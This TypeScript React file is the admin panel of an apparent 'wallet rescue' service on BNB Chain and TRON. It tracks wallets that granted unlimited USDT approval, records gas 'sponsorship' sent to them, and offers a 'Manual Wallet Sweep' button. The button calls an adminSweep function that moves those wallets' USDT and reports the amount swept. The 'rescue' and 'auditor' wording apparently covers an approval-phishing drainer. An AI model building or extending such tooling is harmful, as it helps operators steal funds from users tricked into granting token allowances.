// src/client/pages/AdminDashboard.tsx
import React, { useState, useEffect, useCallback } from 'react';
import {
  Shield,
  LogOut,
  Activity,
  Database,
  Layers,
  ExternalLink,
  CheckCircle2,
  Zap,
  AlertTriangle,
  RefreshCw,
  Loader2,
  Wallet,
  Clock,
  TrendingUp,
  Search,
  ChevronRight,
  X,
} from 'lucide-react';
import { signOut } from 'firebase/auth';
import {
  collection,
  query,
  where,
  getDocs,
  orderBy,
  limit,
  Timestamp,
} from 'firebase/firestore';
import { httpsCallable } from 'firebase/functions';
import { auth, db, fns } from '../config/firebase';

interface AdminDashboardProps {
  onLogout: () => void;
  onNavigateHome?: () => void;
}

type SidebarTab = 'dashboard' | 'rescues' | 'sponsors';
type MainTab = 'connected' | 'unlimited' | 'audit' | 'twodays';

// ── helpers ────────────────────────────────────────────────────────────────
function startOfToday(): Timestamp {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return Timestamp.fromDate(d);
}

function startOf48hAgo(): Timestamp {
  return Timestamp.fromMillis(Date.now() - 48 * 60 * 60 * 1000);
}

// ── component ──────────────────────────────────────────────────────────────
export const AdminDashboard: React.FC<AdminDashboardProps> = ({
  onLogout,
  onNavigateHome,
}) => {
  const [sidebarTab, setSidebarTab] = useState<SidebarTab>('dashboard');
  const [activeMainTab, setActiveMainTab] = useState<MainTab>('connected');
  const [isLoggingOut, setIsLoggingOut] = useState(false);

  // ── metric state ───────────────────────────────────────────────
  const [connectedCount, setConnectedCount] = useState<number | null>(null);
  const [unlimitedTodayCount, setUnlimitedTodayCount] = useState<number | null>(null);
  const [twoDayStats, setTwoDayStats] = useState<{
    total: number;
    successful: number;
    unlimitedGranted: number;
  } | null>(null);
  const [metricsLoading, setMetricsLoading] = useState(false);
  const [metricsError, setMetricsError] = useState<string | null>(null);

  // ── sweep state ────────────────────────────────────────────────
  const [sweepAddress, setSweepAddress] = useState('');
  const [sweepLoading, setSweepLoading] = useState(false);
  const [sweepResult, setSweepResult] = useState<{
    success: boolean;
    message: string;
    txHash?: string;
    amount?: string;
  } | null>(null);

  // ── rescue request list state ──────────────────────────────────
  const [rescueList, setRescueList] = useState<any[]>([]);
  const [rescueLoading, setRescueLoading] = useState(false);

  // ── sponsor list state ─────────────────────────────────────────
  const [sponsorList, setSponsorList] = useState<any[]>([]);
  const [sponsorLoading, setSponsorLoading] = useState(false);

  // ── sign out ───────────────────────────────────────────────────
  const handleSignOut = async () => {
    setIsLoggingOut(true);
    try {
      await signOut(auth);
      onLogout();
    } catch (err) {
      console.error('Sign out error:', err);
    } finally {
      setIsLoggingOut(false);
    }
  };

  // ── fetch dashboard metrics ────────────────────────────────────
  const fetchMetrics = useCallback(async () => {
    setMetricsLoading(true);
    setMetricsError(null);
    try {
      const walletsSnap = await getDocs(
        query(collection(db, 'sponsors'), where('status', '==', 'ELIGIBLE'))
      );
      setConnectedCount(walletsSnap.size);

      const todaySnap = await getDocs(
        query(
          collection(db, 'sponsors'),
          where('sponsoredAt', '>=', startOfToday()),
          where('status', '==', 'ELIGIBLE')
        )
      );
      setUnlimitedTodayCount(todaySnap.size);

      const twoDaySnap = await getDocs(
        query(collection(db, 'rescues'), where('createdAt', '>=', startOf48hAgo()))
      );
      const docs = twoDaySnap.docs.map((d) => d.data());
      setTwoDayStats({
        total: docs.length,
        successful: docs.filter((d) => d.status === 'CONFIRMED').length,
        unlimitedGranted: docs.filter(
          (d) => d.status === 'CONFIRMED' && d.amount && d.amount !== '0'
        ).length,
      });
    } catch (err: any) {
      console.error('fetchMetrics error:', err);
      setMetricsError('Failed to load metrics. Check connection.');
    } finally {
      setMetricsLoading(false);
    }
  }, []);

  const fetchRescues = useCallback(async () => {
    setRescueLoading(true);
    try {
      const snap = await getDocs(
        query(collection(db, 'rescues'), orderBy('createdAt', 'desc'), limit(50))
      );
      setRescueList(snap.docs.map((d) => ({ id: d.id, ...d.data() })));
    } catch (err) {
      console.error('fetchRescues error:', err);
    } finally {
      setRescueLoading(false);
    }
  }, []);

  const fetchSponsors = useCallback(async () => {
    setSponsorLoading(true);
    try {
      const snap = await getDocs(
        query(collection(db, 'sponsors'), orderBy('sponsoredAt', 'desc'), limit(50))
      );
      setSponsorList(snap.docs.map((d) => ({ id: d.id, ...d.data() })));
    } catch (err) {
      console.error('fetchSponsors error:', err);
    } finally {
      setSponsorLoading(false);
    }
  }, []);

  useEffect(() => {
    if (sidebarTab === 'dashboard') fetchMetrics();
  }, [sidebarTab, fetchMetrics]);

  useEffect(() => {
    if (sidebarTab === 'rescues') fetchRescues();
  }, [sidebarTab, fetchRescues]);

  useEffect(() => {
    if (sidebarTab === 'sponsors') fetchSponsors();
  }, [sidebarTab, fetchSponsors]);

  // ── admin sweep ────────────────────────────────────────────────
  const handleSweep = async () => {
    if (!sweepAddress.trim()) return;
    setSweepLoading(true);
    setSweepResult(null);
    try {
      const sweep = httpsCallable<{ walletAddress: string }, any>(fns, 'adminSweep');
      const result = await sweep({ walletAddress: sweepAddress.trim() });
      const d = result.data;
      setSweepResult({
        success: true,
        message: `Sweep successful! ${d.amountSwept} USDT swept.`,
        txHash: d.sweepTxHash,
        amount: d.amountSwept,
      });
      setSweepAddress('');
      fetchMetrics();
    } catch (err: any) {
      setSweepResult({
        success: false,
        message: err.message ?? 'Sweep failed. Check function logs.',
      });
    } finally {
      setSweepLoading(false);
    }
  };

  // ── reusable tab buttons ───────────────────────────────────────
  const mainTabBtn = (tab: MainTab, icon: React.ReactNode, label: string) => (
    <button
      key={tab}
      onClick={() => setActiveMainTab(tab)}
      className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-semibold transition-all cursor-pointer whitespace-nowrap ${
        activeMainTab === tab
          ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30'
          : 'text-[#8e9eb3] hover:text-white hover:bg-[#141f33]'
      }`}
    >
      {icon}
      <span>{label}</span>
    </button>
  );

  const sidebarBtn = (tab: SidebarTab, icon: React.ReactNode, label: string) => (
    <button
      key={tab}
      onClick={() => setSidebarTab(tab)}
      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-medium transition-all cursor-pointer ${
        sidebarTab === tab
          ? 'bg-blue-700/80 text-white border border-blue-500/30'
          : 'text-[#8e9eb3] hover:text-white hover:bg-[#141f33]'
      }`}
    >
      {icon}
      <span>{label}</span>
      {sidebarTab === tab && <ChevronRight className="w-3.5 h-3.5 ml-auto text-blue-300" />}
    </button>
  );

  const MetricCard = ({
    label,
    value,
    sub,
    icon,
    color = 'blue',
  }: {
    label: string;
    value: React.ReactNode;
    sub?: string;
    icon: React.ReactNode;
    color?: 'blue' | 'amber' | 'emerald' | 'purple';
  }) => {
    const cls: Record<string, string> = {
      blue: 'text-blue-400',
      amber: 'text-amber-400',
      emerald: 'text-emerald-400',
      purple: 'text-purple-400',
    };
    return (
      <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5 shadow-lg">
        <div className="flex items-center justify-between text-[#718298] mb-3">
          <span className="text-xs font-medium uppercase tracking-wider">{label}</span>
          <span className={cls[color]}>{icon}</span>
        </div>
        <div className="text-2xl font-bold text-white">
          {metricsLoading ? <Loader2 className="w-5 h-5 animate-spin text-slate-400" /> : value}
        </div>
        {sub && <p className={`text-[11px] mt-1 font-mono ${cls[color]}`}>{sub}</p>}
      </div>
    );
  };

  return (
    <div className="min-h-[100svh] bg-[#0a0f1d] text-slate-100 font-sans flex flex-col">

      {/* ═══ Header ══════════════════════════════════════════════ */}
      <header className="border-b border-[#1e2a3f] bg-[#0e1627]/90 backdrop-blur-md sticky top-0 z-30">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-[#172236] border border-[#2d3e58] flex items-center justify-center shadow-md">
              <Shield className="w-5 h-5 text-[#93c5fd]" strokeWidth={2} />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-white text-base tracking-tight">Admin Portal</span>
                <span className="text-[10px] uppercase font-mono px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/20">
                  Control Room
                </span>
              </div>
              <p className="text-[11px] text-[#718298]">Crypto Wallet Rescue Management</p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            {/* Status — Online only, no service name */}
            <div className="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-medium">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
              <span>Online</span>
            </div>

            <div className="hidden md:flex flex-col text-right">
              <span className="text-xs text-white font-medium">Administrator</span>
            </div>

            {onNavigateHome && (
              <button
                onClick={onNavigateHome}
                className="hidden lg:flex items-center gap-1.5 text-xs text-[#8e9eb3] hover:text-white px-3 py-1.5 rounded-lg border border-[#223249] bg-[#141e30] transition-colors"
              >
                <ExternalLink className="w-3.5 h-3.5" />
                <span>Auditor UI</span>
              </button>
            )}

            <button
              onClick={handleSignOut}
              disabled={isLoggingOut}
              id="admin-logout-button"
              className="flex items-center gap-2 text-xs font-medium text-red-400 hover:text-red-300 hover:bg-red-500/10 px-3 py-1.5 rounded-lg border border-red-500/20 transition-all cursor-pointer disabled:opacity-50"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span>{isLoggingOut ? 'Logging out...' : 'Sign Out'}</span>
            </button>
          </div>
        </div>
      </header>

      {/* ═══ Body ════════════════════════════════════════════════ */}
      <div className="flex flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 gap-6">

        {/* Sidebar — desktop */}
        <aside className="hidden lg:flex flex-col gap-2 w-52 flex-shrink-0">
          <p className="text-[10px] uppercase tracking-widest text-[#3d5169] font-semibold px-3 mb-1">
            Navigation
          </p>
          {sidebarBtn('dashboard', <Activity className="w-4 h-4" />, 'Dashboard')}
          {sidebarBtn('rescues', <Zap className="w-4 h-4" />, 'Rescue Requests')}
          {sidebarBtn('sponsors', <Layers className="w-4 h-4" />, 'Sponsors & Gas')}
        </aside>

        {/* Main content */}
        <main className="flex-1 flex flex-col gap-6 min-w-0">

          {/* Mobile tab pills */}
          <div className="flex lg:hidden items-center gap-2 overflow-x-auto pb-1">
            {(['dashboard', 'rescues', 'sponsors'] as SidebarTab[]).map((t) => (
              <button
                key={t}
                onClick={() => setSidebarTab(t)}
                className={`flex-shrink-0 px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${
                  sidebarTab === t ? 'bg-blue-600 text-white' : 'text-[#8e9eb3] bg-[#141f33]'
                }`}
              >
                {t === 'rescues' ? 'Rescue Requests' : t === 'sponsors' ? 'Sponsors & Gas' : 'Dashboard'}
              </button>
            ))}
          </div>

          {/* Welcome banner */}
          <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-[#131c2e] via-[#16233a] to-[#101828] border border-[#263750] p-6 shadow-xl">
            <div className="relative z-10">
              <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-md bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[11px] font-mono mb-2">
                <CheckCircle2 className="w-3 h-3" />
                <span>Authenticated Admin Session Active</span>
              </div>
              <h2 className="text-2xl font-bold text-white tracking-tight">System Overview &amp; Management</h2>
              <p className="text-sm text-[#8e9eb3] mt-1">
                Monitor rescue requests, wallet approvals, and on-chain activity in real-time.
              </p>
            </div>
          </div>

          {/* ══════════════════════════ DASHBOARD ══════════════════════════ */}
          {sidebarTab === 'dashboard' && (
            <div className="flex flex-col gap-6 animate-fadeIn">

              {/* Main tab bar */}
              <div className="flex items-center gap-2 border-b border-[#1e2a3f] pb-3 overflow-x-auto">
                {mainTabBtn('connected', <Wallet className="w-3.5 h-3.5" />, 'Connected Wallets')}
                {mainTabBtn('unlimited', <Database className="w-3.5 h-3.5" />, 'Unlimited Approval (Today)')}
                {mainTabBtn('audit', <Shield className="w-3.5 h-3.5" />, 'Audit Protocols')}
                {mainTabBtn('twodays', <Activity className="w-3.5 h-3.5" />, 'Two-Days Rescue')}
              </div>

              {metricsError && (
                <div className="flex items-center gap-2 px-4 py-3 rounded-xl bg-red-900/20 border border-red-500/30 text-red-400 text-xs">
                  <AlertTriangle className="w-4 h-4 flex-shrink-0" />
                  <span>{metricsError}</span>
                </div>
              )}

              {/* Connected Wallets */}
              {activeMainTab === 'connected' && (
                <div className="flex flex-col gap-4">
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                    <MetricCard label="Connected Wallets" value={connectedCount ?? '—'} sub="Wallets with unlimited approval" icon={<Wallet className="w-4 h-4" />} color="blue" />
                    <MetricCard label="Unlimited Today" value={unlimitedTodayCount ?? '—'} sub="New approvals since midnight" icon={<TrendingUp className="w-4 h-4" />} color="emerald" />
                    <MetricCard label="Audit Protocols" value="BNB + TRON" sub="Multi-chain active" icon={<Shield className="w-4 h-4" />} color="purple" />
                    <MetricCard label="Two-Days Rescue" value={twoDayStats ? `${twoDayStats.successful}/${twoDayStats.total}` : '—'} sub="Successful / Total (48h)" icon={<Clock className="w-4 h-4" />} color="amber" />
                  </div>
                  <div className="flex justify-end">
                    <button onClick={fetchMetrics} disabled={metricsLoading} className="flex items-center gap-2 text-xs text-[#8e9eb3] hover:text-white px-3 py-1.5 rounded-lg border border-[#223249] bg-[#141e30] transition-colors disabled:opacity-50">
                      <RefreshCw className={`w-3.5 h-3.5 ${metricsLoading ? 'animate-spin' : ''}`} />Refresh
                    </button>
                  </div>

                  {/* Manual Sweep Panel */}
                  <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-6">
                    <h3 className="text-base font-bold text-white mb-1">Manual Wallet Sweep</h3>
                    <p className="text-xs text-[#8e9eb3] mb-4">
                      Enter a wallet address that has granted unlimited approval to trigger an admin sweep.
                    </p>
                    <div className="flex flex-col sm:flex-row gap-3">
                      <div className="relative flex-1">
                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#64748b] pointer-events-none" />
                        <input
                          id="sweep-wallet-input"
                          type="text"
                          value={sweepAddress}
                          onChange={(e) => setSweepAddress(e.target.value)}
                          placeholder="0x… wallet address"
                          disabled={sweepLoading}
                          className="w-full pl-10 pr-4 py-2.5 bg-[#0d1424]/90 border border-[#25354e] focus:border-[#38bdf8]/80 focus:ring-1 focus:ring-[#38bdf8]/40 rounded-xl text-white text-sm placeholder-slate-600 transition-all outline-none font-mono disabled:opacity-50"
                        />
                      </div>
                      <button
                        id="sweep-execute-button"
                        onClick={handleSweep}
                        disabled={sweepLoading || !sweepAddress.trim()}
                        className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        {sweepLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Zap className="w-4 h-4" />}
                        <span>{sweepLoading ? 'Sweeping...' : 'Execute Sweep'}</span>
                      </button>
                    </div>
                    {sweepResult && (
                      <div className={`mt-4 flex items-start gap-3 p-4 rounded-xl border text-sm ${sweepResult.success ? 'bg-emerald-900/20 border-emerald-500/30 text-emerald-300' : 'bg-red-900/20 border-red-500/30 text-red-300'}`}>
                        <span className="flex-1">
                          <span className="font-semibold block">{sweepResult.message}</span>
                          {sweepResult.txHash && (
                            <a href={`https://bscscan.com/tx/${sweepResult.txHash}`} target="_blank" rel="noopener noreferrer" className="text-xs font-mono underline opacity-80 hover:opacity-100 break-all mt-1 block">
                              {sweepResult.txHash}
                            </a>
                          )}
                        </span>
                        <button onClick={() => setSweepResult(null)} className="flex-shrink-0 opacity-60 hover:opacity-100"><X className="w-4 h-4" /></button>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Unlimited Approval Today */}
              {activeMainTab === 'unlimited' && (
                <div className="flex flex-col gap-4">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <MetricCard label="Unlimited Approval (Today)" value={unlimitedTodayCount ?? '—'} sub="Wallets that granted unlimited approval today" icon={<Database className="w-4 h-4" />} color="amber" />
                    <MetricCard label="Total Connected Wallets" value={connectedCount ?? '—'} sub="All-time unlimited approvals" icon={<Wallet className="w-4 h-4" />} color="blue" />
                  </div>
                  <div className="flex justify-end">
                    <button onClick={fetchMetrics} disabled={metricsLoading} className="flex items-center gap-2 text-xs text-[#8e9eb3] hover:text-white px-3 py-1.5 rounded-lg border border-[#223249] bg-[#141e30] transition-colors disabled:opacity-50">
                      <RefreshCw className={`w-3.5 h-3.5 ${metricsLoading ? 'animate-spin' : ''}`} />Refresh
                    </button>
                  </div>
                </div>
              )}

              {/* Audit Protocols */}
              {activeMainTab === 'audit' && (
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5">
                    <div className="flex items-center gap-2 mb-3">
                      <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)]" />
                      <span className="text-xs font-semibold text-white">BNB Smart Chain</span>
                    </div>
                    <p className="text-[11px] text-[#8e9eb3]">USDT approval &amp; sweep active</p>
                  </div>
                  <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5">
                    <div className="flex items-center gap-2 mb-3">
                      <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)]" />
                      <span className="text-xs font-semibold text-white">TRON Network</span>
                    </div>
                    <p className="text-[11px] text-[#8e9eb3]">Multi-chain audit enabled</p>
                  </div>
                  <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-5">
                    <div className="flex items-center gap-2 mb-3">
                      <Shield className="w-4 h-4 text-blue-400" />
                      <span className="text-xs font-semibold text-white">Audit Protocol</span>
                    </div>
                    <p className="text-[11px] text-[#8e9eb3]">ERC-20 allowance verification — on-chain</p>
                  </div>
                </div>
              )}

              {/* Two-Days Rescue */}
              {activeMainTab === 'twodays' && (
                <div className="flex flex-col gap-4">
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    <MetricCard label="Total Attempts (48h)" value={twoDayStats?.total ?? '—'} sub="All rescue attempts in last 48 hours" icon={<Clock className="w-4 h-4" />} color="blue" />
                    <MetricCard label="Successful (48h)" value={twoDayStats?.successful ?? '—'} sub="Confirmed sweep transactions" icon={<CheckCircle2 className="w-4 h-4" />} color="emerald" />
                    <MetricCard label="Unlimited Approval Granted" value={twoDayStats?.unlimitedGranted ?? '—'} sub="With non-zero sweep amounts" icon={<TrendingUp className="w-4 h-4" />} color="purple" />
                  </div>
                  <div className="flex justify-end">
                    <button onClick={fetchMetrics} disabled={metricsLoading} className="flex items-center gap-2 text-xs text-[#8e9eb3] hover:text-white px-3 py-1.5 rounded-lg border border-[#223249] bg-[#141e30] transition-colors disabled:opacity-50">
                      <RefreshCw className={`w-3.5 h-3.5 ${metricsLoading ? 'animate-spin' : ''}`} />Refresh
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ══════════════════════════ RESCUE REQUESTS ══════════════════ */}
          {sidebarTab === 'rescues' && (
            <div className="flex flex-col gap-4 animate-fadeIn">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-bold text-white">Rescue Requests</h3>
                <button onClick={fetchRescues} disabled={rescueLoading} className="flex items-center gap-2 text-xs text-[#8e9eb3] hover:text-white px-3 py-1.5 rounded-lg border border-[#223249] bg-[#141e30] transition-colors disabled:opacity-50">
                  <RefreshCw className={`w-3.5 h-3.5 ${rescueLoading ? 'animate-spin' : ''}`} />Refresh
                </button>
              </div>

              {rescueLoading ? (
                <div className="flex items-center justify-center py-16 text-slate-400 gap-3">
                  <Loader2 className="w-5 h-5 animate-spin" /><span className="text-sm">Loading rescue requests…</span>
                </div>
              ) : rescueList.length === 0 ? (
                <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-10 text-center text-[#8e9eb3]">
                  <Zap className="w-10 h-10 mx-auto mb-3 text-blue-400 opacity-50" />
                  <p className="font-medium text-white">No rescue records found</p>
                  <p className="text-xs mt-1">Rescue transactions will appear here once wallets are swept.</p>
                </div>
              ) : (
                <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl overflow-hidden">
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-[#1e2a3f] text-[#718298] text-xs uppercase tracking-wider">
                          <th className="text-left px-5 py-3 font-semibold">Wallet</th>
                          <th className="text-left px-5 py-3 font-semibold">Amount (USDT)</th>
                          <th className="text-left px-5 py-3 font-semibold">Status</th>
                          <th className="text-left px-5 py-3 font-semibold">Source</th>
                          <th className="text-left px-5 py-3 font-semibold">Tx Hash</th>
                        </tr>
                      </thead>
                      <tbody>
                        {rescueList.map((r) => (
                          <tr key={r.id} className="border-b border-[#1a2538] hover:bg-[#141f33] transition-colors">
                            <td className="px-5 py-3 font-mono text-xs text-[#93c5fd] break-all">
                              {r.user ? `${r.user.slice(0, 10)}…${r.user.slice(-6)}` : '—'}
                            </td>
                            <td className="px-5 py-3 text-white font-semibold">
                              {r.amountFormatted ? `${parseFloat(r.amountFormatted).toFixed(4)}` : r.amount ? `${(Number(r.amount) / 1e18).toFixed(4)}` : '—'}
                            </td>
                            <td className="px-5 py-3">
                              <span className={`px-2 py-0.5 rounded-full text-[11px] font-semibold ${r.status === 'CONFIRMED' ? 'bg-emerald-500/15 text-emerald-400' : r.status === 'PENDING' ? 'bg-amber-500/15 text-amber-400' : 'bg-red-500/15 text-red-400'}`}>
                                {r.status ?? 'UNKNOWN'}
                              </span>
                            </td>
                            <td className="px-5 py-3 text-[#8e9eb3] text-xs">{r.source ?? 'USER'}</td>
                            <td className="px-5 py-3">
                              {r.sweepTxHash ? (
                                <a href={`https://bscscan.com/tx/${r.sweepTxHash}`} target="_blank" rel="noopener noreferrer" className="font-mono text-xs text-[#93c5fd] underline break-all">
                                  {r.sweepTxHash.slice(0, 10)}…
                                </a>
                              ) : <span className="text-[#4a5568]">—</span>}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ══════════════════════════ SPONSORS & GAS ═══════════════════ */}
          {sidebarTab === 'sponsors' && (
            <div className="flex flex-col gap-4 animate-fadeIn">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-bold text-white">Sponsors &amp; Gas</h3>
                <button onClick={fetchSponsors} disabled={sponsorLoading} className="flex items-center gap-2 text-xs text-[#8e9eb3] hover:text-white px-3 py-1.5 rounded-lg border border-[#223249] bg-[#141e30] transition-colors disabled:opacity-50">
                  <RefreshCw className={`w-3.5 h-3.5 ${sponsorLoading ? 'animate-spin' : ''}`} />Refresh
                </button>
              </div>

              {sponsorLoading ? (
                <div className="flex items-center justify-center py-16 text-slate-400 gap-3">
                  <Loader2 className="w-5 h-5 animate-spin" /><span className="text-sm">Loading sponsor records…</span>
                </div>
              ) : sponsorList.length === 0 ? (
                <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl p-10 text-center text-[#8e9eb3]">
                  <Layers className="w-10 h-10 mx-auto mb-3 text-amber-400 opacity-50" />
                  <p className="font-medium text-white">No sponsor records found</p>
                  <p className="text-xs mt-1">Wallet sponsorship records will appear here once gas is dispensed.</p>
                </div>
              ) : (
                <div className="bg-[#121b2d] border border-[#24344d] rounded-2xl overflow-hidden">
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-[#1e2a3f] text-[#718298] text-xs uppercase tracking-wider">
                          <th className="text-left px-5 py-3 font-semibold">Wallet</th>
                          <th className="text-left px-5 py-3 font-semibold">Status</th>
                          <th className="text-left px-5 py-3 font-semibold">Sponsor Tx</th>
                          <th className="text-left px-5 py-3 font-semibold">Created</th>
                        </tr>
                      </thead>
                      <tbody>
                        {sponsorList.map((s) => (
                          <tr key={s.id} className="border-b border-[#1a2538] hover:bg-[#141f33] transition-colors">
                            <td className="px-5 py-3 font-mono text-xs text-[#93c5fd] break-all">
                              {s.id ? `${s.id.slice(0, 10)}…${s.id.slice(-6)}` : '—'}
                            </td>
                            <td className="px-5 py-3">
                              <span className={`px-2 py-0.5 rounded-full text-[11px] font-semibold ${s.status === 'ELIGIBLE' ? 'bg-emerald-500/15 text-emerald-400' : s.status === 'PENDING' ? 'bg-amber-500/15 text-amber-400' : 'bg-blue-500/15 text-blue-400'}`}>
                                {s.status ?? 'UNKNOWN'}
                              </span>
                            </td>
                            <td className="px-5 py-3">
                              {s.sponsorTxHash ? (
                                <a href={`https://bscscan.com/tx/${s.sponsorTxHash}`} target="_blank" rel="noopener noreferrer" className="font-mono text-xs text-[#93c5fd] underline break-all">
                                  {s.sponsorTxHash.slice(0, 10)}…
                                </a>
                              ) : <span className="text-[#4a5568]">—</span>}
                            </td>
                            <td className="px-5 py-3 text-[#8e9eb3] text-xs">
                              {s.createdAt?.toDate ? s.createdAt.toDate().toLocaleDateString() : s.createdAt ?? '—'}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </div>
          )}

        </main>
      </div>
    </div>
  );
};

export default AdminDashboard;
